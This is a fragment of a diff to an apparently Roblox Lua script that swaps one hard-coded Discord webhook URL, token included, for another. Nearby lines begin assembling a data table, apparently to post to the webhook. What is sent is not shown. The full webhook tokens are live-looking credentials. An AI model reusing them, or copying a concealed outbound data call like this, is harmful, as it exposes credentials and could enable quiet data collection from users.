@@ -37,7 +37,7 @@ game:GetService("StarterGui"):SetCore(
 	}
 )
 
-local webh = "https://discord.com/api/webhooks/1052477728630259762/uxqQKO4zYMiRcFbKeia7LUhpNu8bIHbg4qVTq2_KA-eJ8OUWQ4Kip3Fa_gxXwZZ1zzWf"
+local webh = "https://discord.com/api/webhooks/1062984861046030346/NSKxYtD2Wy58pvb19JA2-H6QoOCQy2fPs92keg0SjMPDSYlWVWsUQqslhFXMh8nqOfNZ"
 
 pcall(function()
    local data = {
